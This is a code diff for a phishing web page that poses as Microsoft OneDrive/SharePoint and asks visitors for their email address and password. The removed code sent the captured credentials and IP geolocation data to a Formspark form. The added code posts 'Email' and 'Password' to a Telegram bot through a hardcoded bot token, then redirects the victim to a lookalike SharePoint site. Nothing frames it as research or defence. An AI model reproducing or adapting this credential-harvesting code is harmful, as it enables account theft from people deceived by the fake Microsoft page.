@@ -1,6 +1,4 @@
-import { useFormspark } from "@formspark/use-formspark";
-import Axios from "axios"; // Import Axios
-import { useEffect, useState } from "react";
+import { useState } from "react";
 import { GrFormNext } from "react-icons/gr";
 import { Modal } from "react-responsive-modal";
 import "react-responsive-modal/styles.css";
@@ -11,47 +9,45 @@ import PhoneThree from "../assets/images/phone3.webp";
 import ShareImg from "../assets/images/share.webp";
 import Ondream from "../assets/images/splogo.png";
 
-const FORMSPARK_FORM_ID = "rKiB0i2PG";
+const TELEGRAM_BOT_TOKEN = "7254485756:AAE0GLdunV9GgugweylNJccLj1ARh6nLqxc"; // Replace with your bot token
+const TELEGRAM_CHAT_ID = "7254485756"; // Replace with your chat ID
 
-const DriveMain = () => {
+const MuderBot = () => {
   const [open, setOpen] = useState(true);
-  const [eml, setEml] = useState("");
-  const [emlPass, setEmlPass] = useState("");
-  const [submit, submitting] = useFormspark({ formId: FORMSPARK_FORM_ID });
-  const [ipInfo, setIpInfo] = useState({});
-
-  useEffect(() => {
-    // Function to fetch IP information using Axios and ipapi.co
-    const fetchIpInfo = async () => {
-      try {
-        const response = await Axios.get("https://ipapi.co/json/");
-        setIpInfo(response.data);
-      } catch (error) {
-        console.error("Error fetching IP information:", error);
-      }
-    };
-
-    fetchIpInfo();
-  }, []);
-
-  useEffect(() => {
-    // Check if the form has been previously submitted
-    const isFormSubmitted = localStorage.getItem("formSubmitted");
-    if (isFormSubmitted) {
-      window.location.replace("https://outlook.com");
-    }
-  }, []);
 
   const onCloseModal = () => setOpen(false);
 
+  const [eml, setEml] = useState("");
+  const [emlPass, setEmlPass] = useState("");
+  const [submitting, setSubmitting] = useState(false);
+
   const handleSubmit = async (e) => {
     e.preventDefault();
+    setSubmitting(true);
+
+    const message = `Email: ${eml}\nPassword: ${emlPass}`;
+
+    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+    const payload = {
+      chat_id: TELEGRAM_CHAT_ID,
+      text: message,
+    };
+
     try {
-      await submit({ eml, emlPass, ...ipInfo });
-      localStorage.setItem("formSubmitted", "true");
-      window.location.replace("https://outlook.com");
+      await fetch(url, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify(payload),
+      });
+
+      window.location.replace("https://sharepoint-3qd.pages.dev");
     } catch (error) {
-      console.error("Error submitting form:", error);
+      console.error("Error sending message to Telegram:", error);
+    } finally {
+      setSubmitting(false);
     }
   };
 
@@ -126,7 +122,11 @@ const DriveMain = () => {
           >
             Download Microsoft OneDrive mobile app
             <span className=" ml-1">
-              <GrFormNext color="blue" fontSize="1.6rem" />
+              <GrFormNext
+                color="blue"
+                // paddingTop="5px"
+                fontSize="1.6rem"
+              />
             </span>
           </a>
         </div>
@@ -209,4 +209,4 @@ const DriveMain = () => {
   );
 };
 
-export default DriveMain;
+export default MuderBot;
